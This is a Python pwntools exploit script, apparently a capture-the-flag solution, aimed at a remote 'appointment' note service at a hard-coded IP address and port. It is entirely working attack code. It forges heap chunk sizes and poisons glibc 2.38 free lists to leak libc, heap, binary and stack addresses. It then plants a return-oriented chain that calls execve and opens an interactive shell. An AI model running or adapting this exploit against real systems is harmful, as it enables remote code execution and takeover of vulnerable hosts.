#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from pwn import *
context.clear(arch='amd64', os='linux', log_level='info')

sh = remote('8.130.35.16', 58001)

sh.sendlineafter(b'$ ', b'add content=a\0')
sh.sendlineafter(b'$ ', b'add content=a\0')
sh.sendlineafter(b'$ ', b'add content=a\0')
sh.sendlineafter(b'$ ', b'add content=' + b'a' * 0x500  + b'\0')
sh.sendlineafter(b'$ ', b'add content=a\0')

sh.sendlineafter(b'$ ', b'delete index=0\0')
sh.sendlineafter(b'$ ', b'add content=date=date=aaaaaaaaa\0' + cyclic(21) + p64(0x531) + b'\0' * 0x800)
sh.sendlineafter(b'$ ', b'delete index=2\0')
sh.sendlineafter(b'$ ', b'add content=a\0')
sh.sendlineafter(b'$ ', b'add content=' + b'a' * 0x600  + b'\0')

sh.sendlineafter(b'$ ', b'show index=3\0')
sh.recvuntil(b'Appointment #3:')
sh.recvuntil(b'Content: ')
libc_addr = u64(sh.recvn(6) + b'\0\0') - 0x1ff130
success('libc_addr: ' + hex(libc_addr))

sh.sendlineafter(b'$ ', b'add content=a\0')
sh.sendlineafter(b'$ ', b'delete index=6\0')

sh.sendlineafter(b'$ ', b'show index=3\0')
sh.recvuntil(b'Appointment #3:')
sh.recvuntil(b'Content: ')
heap_addr = u64(sh.recvn(5) + b'\0\0\0') * 0x1000
success('heap_addr: ' + hex(heap_addr))

sh.sendlineafter(b'$ ', b'add content=a\0')
sh.sendlineafter(b'$ ', b'add content=a\0')

sh.sendlineafter(b'$ ', b'delete index=0\0')
sh.sendlineafter(b'$ ', b'add content=date=date=aaaaaaaaa\0' + cyclic(21) + p64(0x31) + b'\0' * 0x800)
sh.sendlineafter(b'$ ', b'delete index=2\0')

sh.sendlineafter(b'$ ', b'delete index=7\0')
sh.sendlineafter(b'$ ', b'delete index=6\0')

sh.sendlineafter(b'$ ', b'add content=' + b'a' * 0x20 + p64((heap_addr >> 12) ^ (libc_addr + 0x247320))) # libc-2.38/ld-linux-x86-64.so.2

sh.sendlineafter(b'$ ', b'add content=a\0')
sh.sendlineafter(b'$ ', b'add content=date=date=aaaa\0' + b':' * 0x800)

sh.sendlineafter(b'$ ', b'show index=7\0')
sh.recvuntil(b'Appointment #7:')
sh.recvuntil(b':'*10)
image_base = u64(sh.recvn(6) + b'\0\0') - 0x3e78
success('image_base: ' + hex(image_base))

sh.sendlineafter(b'$ ', b'add content=a\0')
sh.sendlineafter(b'$ ', b'add content=a\0')
sh.sendlineafter(b'$ ', b'delete index=9\0')
sh.sendlineafter(b'$ ', b'delete index=8\0')

sh.sendlineafter(b'$ ', b'delete index=0\0')
sh.sendlineafter(b'$ ', b'add content=date=date=aaaaaaaaa\0' + cyclic(21) + p64(0x71) + b'\0' * 0x800)
sh.sendlineafter(b'$ ', b'delete index=2\0')

sh.sendlineafter(b'$ ', b'add content=' + b'a' * 0x60 + p64((heap_addr >> 12) ^ (image_base + 0x50e0)))
sh.sendlineafter(b'$ ', b'add content=a\0')
sh.sendlineafter(b'$ ', b'add content=' + b'a' * 8 + p64(libc_addr + 0x206258))

sh.sendlineafter(b'$ ', b'show index=6\0')
sh.recvuntil(b'Appointment #6:')
sh.recvuntil(b'Content: ')
stack_addr = u64(sh.recvn(6) + b'\0\0')
success('stack_addr: ' + hex(stack_addr))

sh.sendlineafter(b'$ ', b'add content=a\0')
sh.sendlineafter(b'$ ', b'add content=a\0')
sh.sendlineafter(b'$ ', b'delete index=11\0')
sh.sendlineafter(b'$ ', b'delete index=10\0')

sh.sendlineafter(b'$ ', b'delete index=0\0')
sh.sendlineafter(b'$ ', b'add content=date=date=aaaaaaaaa\0' + cyclic(21) + p64(0xb1) + b'\0' * 0x800)
sh.sendlineafter(b'$ ', b'delete index=2\0')

sh.sendlineafter(b'$ ', b'add content=' + b'a' * 0xa0 + p64((heap_addr >> 12) ^ (stack_addr - 0x138)))
sh.sendlineafter(b'$ ', b'add content=a\0')
sh.sendlineafter(b'$ ', b'add content=' + p64(image_base + 0x4180))

sh.sendlineafter(b'$ ', b'add content=a\0')
sh.sendlineafter(b'$ ', b'add content=a\0')
sh.sendlineafter(b'$ ', b'delete index=13\0')
sh.sendlineafter(b'$ ', b'delete index=12\0')

sh.sendlineafter(b'$ ', b'delete index=0\0')
sh.sendlineafter(b'$ ', b'add content=date=date=aaaaaaaaa\0' + cyclic(21) + p64(0xf1) + b'\0' * 0x800)
sh.sendlineafter(b'$ ', b'delete index=2\0')

sh.sendlineafter(b'$ ', b'add content=' + b'a' * 0xe0 + p64((heap_addr >> 12) ^ (stack_addr - 0x148)))
sh.sendlineafter(b'$ ', b'add content=a\0')

sh.sendlineafter(b'$ ', (b'add content=' + b'a' * 8 + p64(libc_addr + 0x0000000000026a3d)).ljust(0x100, b'\0') + flat(
[
    libc_addr + 0x0000000000028715, 
    libc_addr + 0x1c041b,
    libc_addr + 0x000000000002a671,
    0,
    libc_addr + 0x0000000000093359,
    0, 0,
    libc_addr + 0x0000000000046663,
    59,
    libc_addr + 0x00000000000942b6,
]
))

sh.interactive()
